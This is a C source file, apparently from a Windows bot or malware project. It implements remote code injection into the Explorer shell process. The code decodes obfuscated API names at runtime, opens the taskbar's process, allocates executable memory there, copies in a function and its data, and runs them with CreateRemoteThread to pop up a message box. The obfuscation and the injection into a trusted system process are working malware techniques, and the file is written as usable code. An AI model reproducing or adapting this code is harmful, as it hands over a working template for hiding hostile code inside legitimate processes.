#include "stuff.h"
#include "externals.h"

// by _FIL73R_
#ifndef NO_MSGBOX
#define MAX_MSGBOX_MESSAGE_SIZE		256

typedef HMODULE (WINAPI *LL)(LPCSTR); // LoadLibraryA
typedef FARPROC (WINAPI *GPA)(HMODULE, LPCSTR); // GetProcessAddress

typedef struct _INJECT_STRUCT 
{
    LL LoadLibrary;
    GPA GetProcAddress;
    char szUser32[16];
    char szMessageBox[16];
    char szMessage[MAX_MSGBOX_MESSAGE_SIZE];
} INJECT_STRUCT, *PINJECT_STRUCT;

DWORD WINAPI RemoteMessageBox(LPVOID injStr)
{
	typedef BOOL (WINAPI *pMessageBox)(HWND,LPCTSTR,LPCTSTR,UINT);

	PINJECT_STRUCT pInj = (PINJECT_STRUCT)injStr;
	HMODULE hLib;

	hLib = pInj->LoadLibrary(pInj->szUser32);
	if (!hLib)
		return 0;

	pMessageBox rMessageBox;
	rMessageBox = (pMessageBox)pInj->GetProcAddress(hLib, pInj->szMessageBox);
	if (!rMessageBox)
		return 0;

	rMessageBox(NULL, pInj->szMessage, NULL, MB_ICONERROR | MB_OK);

	return 1;
}

static void __declspec() ProcEnd() {}

int InjectMessageBox(char *errormessage) 
{
	DWORD	dwPid,
			dwProcSize,
			dwWr;
	HWND	hDesk;
	INJECT_STRUCT injStr;
	HANDLE	hProc;
	HMODULE kernel32_dll;
	LPVOID	pAddr,
			pStrAddr;

	if (strlen(errormessage) < 1)
		return 0;

	typedef HANDLE (__stdcall *CRT)(HANDLE,LPSECURITY_ATTRIBUTES,SIZE_T,LPTHREAD_START_ROUTINE,LPVOID,DWORD,LPDWORD);
	typedef BOOL (__stdcall *VFE)(HANDLE,LPVOID,SIZE_T,DWORD);
	typedef LPVOID (__stdcall *VAE)(HANDLE,LPVOID,SIZE_T,DWORD,DWORD);
	typedef BOOL (__stdcall *WPM)(HANDLE,LPVOID,LPCVOID,SIZE_T,SIZE_T*);

	CRT fCreateRemoteThread;
	VFE fVirtualFreeEx;
	VAE fVirtualAllocEx;
	WPM fWriteProcessMemory;

	kernel32_dll = LoadLibrary(strings[Decode(dll_kernel32)].encoded);
	if (kernel32_dll)
	{
		fWriteProcessMemory = (WPM)GetProcAddress(kernel32_dll, strings[Decode(dll_WriteProcessMemory)].encoded);
		fVirtualFreeEx = (VFE)GetProcAddress(kernel32_dll, strings[Decode(dll_VirtualFreeEx)].encoded);
		fVirtualAllocEx = (VAE)GetProcAddress(kernel32_dll, strings[Decode(dll_VirtualAllocEx)].encoded);
		fCreateRemoteThread = (CRT)GetProcAddress(kernel32_dll, strings[Decode(dll_CreateRemoteThread)].encoded);

		if (!fWriteProcessMemory || !fVirtualFreeEx || !fVirtualAllocEx || !fCreateRemoteThread)
			return 0;
	}
	else
		return 0;
	
	hDesk = fFindWindow("Shell_TrayWnd", 0);
	if( !hDesk )
		return 0;

	fGetWindowThreadProcessId(hDesk, &dwPid);
	if( !dwPid )
		return 0;

	injStr.LoadLibrary = (LL)GetProcAddress(kernel32_dll, strings[Decode(dll_LoadLibraryA)].encoded);
	injStr.GetProcAddress = (GPA)GetProcAddress(kernel32_dll, strings[Decode(dll_GetProcAddress)].encoded);
	strcpy(injStr.szUser32, strings[Decode(dll_user32)].encoded);
	strcpy(injStr.szMessageBox, strings[Decode(dll_MessageBoxA)].encoded);
	strncpy(injStr.szMessage, errormessage, sizeof(injStr.szMessage) - 1);

	FreeLibrary(kernel32_dll);

	hProc = fOpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
						PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, 
						FALSE, 
						dwPid);
	if (!hProc)
		return 0;

	dwProcSize = (DWORD)ProcEnd - (DWORD)RemoteMessageBox;

	pAddr = fVirtualAllocEx(hProc, NULL, dwProcSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (!pAddr)
	{
		fCloseHandle(hProc);
		return 0;
	}

	pStrAddr = fVirtualAllocEx(hProc, NULL, sizeof(injStr), MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	if (!pStrAddr) 
	{
        fVirtualFreeEx(hProc, pAddr, 0, MEM_RELEASE);
		fCloseHandle(hProc);
        return 0;
	}

	if (!fWriteProcessMemory(hProc, pAddr, (LPCVOID)RemoteMessageBox, dwProcSize, &dwWr)) 
	{
        fVirtualFreeEx(hProc, pAddr, 0, MEM_RELEASE);
        fVirtualFreeEx(hProc, pStrAddr, 0, MEM_RELEASE);
		fCloseHandle(hProc);
        return 0;
	}

	if (!fWriteProcessMemory(hProc, pStrAddr, &injStr, sizeof(injStr), &dwWr)) 
	{
        fVirtualFreeEx(hProc, pAddr, 0, MEM_RELEASE);
        fVirtualFreeEx(hProc, pStrAddr, 0, MEM_RELEASE);
		fCloseHandle(hProc);
        return 0;
	}

	DWORD thread_id;
	HANDLE remote_thread = fCreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pAddr, pStrAddr, 0, &thread_id);

	if (!remote_thread) 
	{
        fVirtualFreeEx(hProc, pAddr, 0, MEM_RELEASE);
        fVirtualFreeEx(hProc, pStrAddr, 0, MEM_RELEASE);
		fCloseHandle(hProc);
        return 0;
	}

	//WaitForSingleObject(remote_thread, INFINITE);
	fCloseHandle(hProc);
	return 1;
}

#endif